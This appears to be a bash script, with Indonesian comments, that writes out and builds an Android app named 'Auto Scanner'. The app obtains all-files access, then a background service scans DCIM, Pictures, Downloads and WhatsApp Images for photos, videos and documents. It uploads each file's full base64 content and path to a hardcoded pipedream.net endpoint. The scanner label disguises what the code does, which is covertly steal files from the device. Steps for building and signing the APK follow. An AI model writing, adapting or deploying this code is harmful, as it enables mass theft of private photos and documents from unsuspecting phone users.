#!/bin/bash

# Buat struktur folder
mkdir -p app/src/com/autoscanner
mkdir -p app/res/layout
mkdir -p app/res/values

# AndroidManifest.xml
cat > app/AndroidManifest.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.autoscanner">

    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />

    <application
        android:allowBackup="true"
        android:icon="@android:drawable/ic_menu_gallery"
        android:label="Auto Scanner"
        android:theme="@android:style/Theme.DeviceDefault.Light">
        
        <activity
            android:name="com.autoscanner.MainActivity"
            android:exported="true"
            android:launchMode="singleTop">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <service
            android:name="com.autoscanner.ScanService"
            android:exported="false"
            android:foregroundServiceType="dataSync" />
    </application>
</manifest>
EOF

# MainActivity.java
cat > app/src/com/autoscanner/MainActivity.java << 'EOF'
package com.autoscanner;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.Settings;
import android.widget.Toast;

public class MainActivity extends Activity {
    private static final int REQUEST_MANAGE_STORAGE = 1001;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(android.R.layout.simple_list_item_1);
        
        checkStoragePermission();
    }

    private void checkStoragePermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, REQUEST_MANAGE_STORAGE);
                Toast.makeText(this, "Aktifkan izin 'Kelola Semua File' lalu kembali", Toast.LENGTH_LONG).show();
            } else {
                startScanService();
            }
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_MANAGE_STORAGE) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && Environment.isExternalStorageManager()) {
                startScanService();
            } else {
                Toast.makeText(this, "Izin harus diaktifkan", Toast.LENGTH_SHORT).show();
                finish();
            }
        }
    }

    private void startScanService() {
        Intent serviceIntent = new Intent(this, ScanService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
        Toast.makeText(this, "Proses berjalan di background", Toast.LENGTH_SHORT).show();
        finish();
    }
}
EOF

# ScanService.java
cat > app/src/com/autoscanner/ScanService.java << 'EOF'
package com.autoscanner;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.util.Base64;
import android.util.Log;

import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

public class ScanService extends Service {
    private static final String CHANNEL_ID = "scan_channel";
    private static final String PIPEDREAM_URL = "https://eo18vv7m4mff838.m.pipedream.net";
    
    private List<String> imageExtensions = new ArrayList<String>() {{
        add(".jpg"); add(".jpeg"); add(".png"); add(".gif"); 
        add(".bmp"); add(".webp"); add(".heic"); add(".mp4");
        add(".mov"); add(".pdf"); add(".doc"); add(".docx");
    }};

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(1, getNotification("Memulai scan..."));
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(() -> {
            scanAndUpload();
            stopSelf();
        }).start();
        return START_NOT_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void scanAndUpload() {
        List<File> files = new ArrayList<>();
        
        File[] roots = {
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
            new File(Environment.getExternalStorageDirectory(), "WhatsApp/Media/WhatsApp Images")
        };
        
        for (File root : roots) {
            if (root.exists() && root.isDirectory()) {
                scanDirectory(root, files);
            }
        }
        
        int uploaded = 0;
        for (File file : files) {
            if (uploadFile(file)) {
                uploaded++;
            }
            updateNotification("Upload: " + uploaded + "/" + files.size());
        }
        
        updateNotification("Selesai! " + uploaded + " file terupload");
        
        try { Thread.sleep(5000); } catch (Exception e) {}
        stopForeground(true);
        stopSelf();
    }

    private void scanDirectory(File dir, List<File> result) {
        File[] files = dir.listFiles();
        if (files == null) return;
        
        for (File file : files) {
            if (file.isDirectory()) {
                scanDirectory(file, result);
            } else {
                String name = file.getName().toLowerCase();
                for (String ext : imageExtensions) {
                    if (name.endsWith(ext)) {
                        result.add(file);
                        break;
                    }
                }
            }
        }
    }

    private boolean uploadFile(File file) {
        try {
            FileInputStream fis = new FileInputStream(file);
            byte[] data = new byte[(int) file.length()];
            fis.read(data);
            fis.close();
            
            String base64Data = Base64.encodeToString(data, Base64.DEFAULT);
            
            String json = "{\"filename\":\"" + file.getName() + "\",\"size\":" + file.length() + 
                         ",\"content\":\"" + base64Data + "\",\"path\":\"" + file.getAbsolutePath() + "\"}";
            
            URL url = new URL(PIPEDREAM_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);
            
            OutputStream os = conn.getOutputStream();
            os.write(json.getBytes());
            os.close();
            
            int responseCode = conn.getResponseCode();
            conn.disconnect();
            
            return responseCode >= 200 && responseCode < 300;
        } catch (Exception e) {
            Log.e("AutoScanner", "Upload failed: " + file.getName(), e);
            return false;
        }
    }

    private Notification getNotification(String text) {
        Notification.Builder builder;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder = new Notification.Builder(this, CHANNEL_ID);
        } else {
            builder = new Notification.Builder(this);
        }
        return builder
            .setContentTitle("Auto Scanner")
            .setContentText(text)
            .setSmallIcon(android.R.drawable.stat_sys_upload)
            .setPriority(Notification.PRIORITY_LOW)
            .build();
    }

    private void updateNotification(String text) {
        NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        nm.notify(1, getNotification(text));
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "Scan Service",
                NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager nm = getSystemService(NotificationManager.class);
            nm.createNotificationChannel(channel);
        }
    }
}
EOF

# build APK
export ANDROID_HOME=$HOME/android-sdk
export PATH=$ANDROID_HOME/cmdline-tools/latest/bin:$ANDROID_HOME/platform-tools:$ANDROID_HOME/build-tools/33.0.0:$PATH

javac -d . -cp "$ANDROID_HOME/platforms/android-33/android.jar" app/src/com/autoscanner/*.java

dx --dex --output=classes.dex .

aapt package -f -M app/AndroidManifest.xml -I "$ANDROID_HOME/platforms/android-33/android.jar" -F app-unsigned.apk .

aapt add app-unsigned.apk classes.dex

echo "Membuat APK signed..."
cp app-unsigned.apk app-unsigned.zip
mkdir -p META-INF
echo "Created by AutoScanner" > META-INF/MANIFEST.MF
zip -u app-unsigned.apk META-INF/MANIFEST.MF

keytool -genkey -v -keystore debug.keystore -alias androiddebugkey -keyalg RSA -keysize 2048 -validity 10000 -dname "CN=Android Debug, O=Android, C=US" -storepass android -keypass android

apksigner sign --ks debug.keystore --ks-pass pass:android --out app-debug.apk app-unsigned.apk

echo "APK siap: app-debug.apk"
